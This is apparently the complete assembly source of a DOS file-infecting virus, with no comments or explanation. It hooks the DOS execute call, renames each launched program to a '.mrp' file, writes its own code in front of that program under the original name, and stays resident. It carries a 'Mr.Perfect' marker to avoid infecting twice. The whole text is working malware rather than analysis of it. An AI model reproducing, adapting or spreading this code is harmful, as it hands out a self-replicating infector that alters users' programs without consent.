code		segment
	assume cs:code,ds:code
	org 100h
start:
	mov ax,offset iniz
	push ax
	ret
nuovoint21:
	cmp ah,4bh
	jz cont_int21
	jmp go_away
cont_int21:
	push ax
	push bx
	push cx
	push es
	push si
	push di
	push ds
	push dx

	push ds
	pop ax
	push cs
	pop ds
	mov word ptr data,ax
	mov ax,dx
	mov word ptr data2,ax

	mov ax,word ptr data
	push ax
	pop es
	mov bx,word ptr data2
	mov dx,bx
	mov cx,dx
	lea dx,newname
cic1:
	mov al,es:byte ptr[bx]
	xchg bx,dx
	mov byte ptr[bx],al
	inc bx
	inc dx
	cmp al,'.'
	jz do_ext
	xchg bx,dx
	jmp cic1
do_ext:
	lea dx,n_ext
	xchg bx,dx
cic2:
	mov al,byte ptr[bx]
	xchg bx,dx
	mov byte ptr[bx],al
	inc bx
	inc dx
	cmp al,0
	jz contr
	xchg bx,dx
	jmp cic2
contr:
	mov ah,3dh
	mov al,2
	mov bx,word ptr data2
	mov dx,bx	
	mov bx,word ptr data
	push bx
	pop ds
	int 21h
	push cs
	pop ds
	mov word ptr hh,ax
	mov bx,ax
	lea dx,newname2
	mov cx,20
	mov ah,3fh
	int 21h
	mov ah,3eh
	mov bx,word ptr hh
	int 21h
	lea si,newname2
	add si,5
	push cs
	pop es
	lea di,nuovoint21
	mov cx,10
	repe cmpsb
	jz eguali


ok_name:
	mov ax,word ptr data2
	mov dx,ax
	lea di,newname
	push cs
	pop es
	mov ax,word ptr data
	push ax
	pop ds
	mov ah,56h
	push dx
	push ds
	int 21h
	pop ds
	pop dx
	xor cx,cx
	mov ah,3ch
	int 21h
	push cs
	pop ds
	mov word ptr hh,ax
	lea cx,finepr
	sub cx,100h
	mov bx,ax
	mov dx,100h
	mov ah,40h
	int 21h
	;
	lea dx,newname
	mov al,2
	mov ah,3dh
	int 21h
	mov word ptr hh2,ax
cic3:
	mov bx,word ptr hh2
	mov cx,20
	lea dx,newname2
	mov ah,3fh
	int 21h
	mov word ptr count,ax
	mov cx,ax
	mov bx,word ptr hh
	lea dx,newname2
	mov ah,40h
	int 21h
	mov ax,word ptr count
	cmp ax,20
	je cic3

	mov bx,word ptr hh
	mov ah,3eh
	int 21h
	mov bx,word ptr hh2
	mov ah,3eh
	int 21h
	jmp load_mrp


eguali:
	mov ax,word ptr data
	mov bx,word ptr data2
	mov dx,bx
	push ax
	pop ds
	mov al,2
	mov ah,3dh
	int 21h
	push cs
	pop ds
	mov word ptr hh,ax
	mov bx,ax
	xor al,al
	mov ah,42h
	xor cx,cx
	lea dx,finepr
	sub dx,100h
	int 21h
	mov ah,3ch
	xor cx,cx
	lea dx,newname
	int 21h
	mov word ptr hh2,ax
cic4:
	mov ah,3fh
	mov bx,word ptr hh
	mov cx,20
	lea dx,newname2
	int 21h
	mov word ptr count,ax
	mov cx,ax
	mov bx,word ptr hh2
	mov ah,40h
	lea dx,newname2
	int 21h
	mov ax,word ptr count
	cmp ax,20
	je cic4
	mov ah,3eh
	mov bx,word ptr hh
	int 21h
	mov ah,3eh
	mov bx,word ptr hh2
	int 21h

load_mrp:
	pop dx
	lea dx,newname
	pop ds
	push cs
	pop ds

	pop di
	pop si
	pop es
	pop cx
	pop bx
	pop ax
	
	pushf
	db 9ah
ll1:    dw 0
ll2:    dw 0
	push ax
	push dx
	push ds

	push cs
	pop ds
	mov ah,41h
	lea dx,newname
	int 21h

	pop ds
	pop dx
	pop ax

	iret
go_away:
	db 0eah
l1:	db 0,0
l2:	db 0,0
n_ext:	db'mrp',0
hh:	dw 0
hh2:	dw 0
data:	dw 0
data2:	dw 0
count:	dw 0
newname: db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
newname2: db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
iniz:
	mov ah,35h
	mov al,21h
	int 21h
	mov ax,es
	mov ds,ax
	push cs
	pop es
	mov di,offset ric
	mov si,di
	mov cx,10
	repe cmpsb
	jz exit
	mov ax,ds
	mov es,ax
	push cs
	pop ds
	mov word ptr l1,bx
	mov word ptr l2,es
	mov word ptr ll1,bx
	mov word ptr ll2,es
	push cs
	pop ds


	mov dx,offset nuovoint21
	mov ah,25h
	mov al,21h
	int 21h
	push cs
	pop es
	mov es,es:[2ch]
	mov ah,49h
	int 21h
	lea dx,finepr
	int 27h
ric:	db'Mr.Perfect'
exit:
	mov ah,4bh
finepr:	db 0
code		ends
	end start
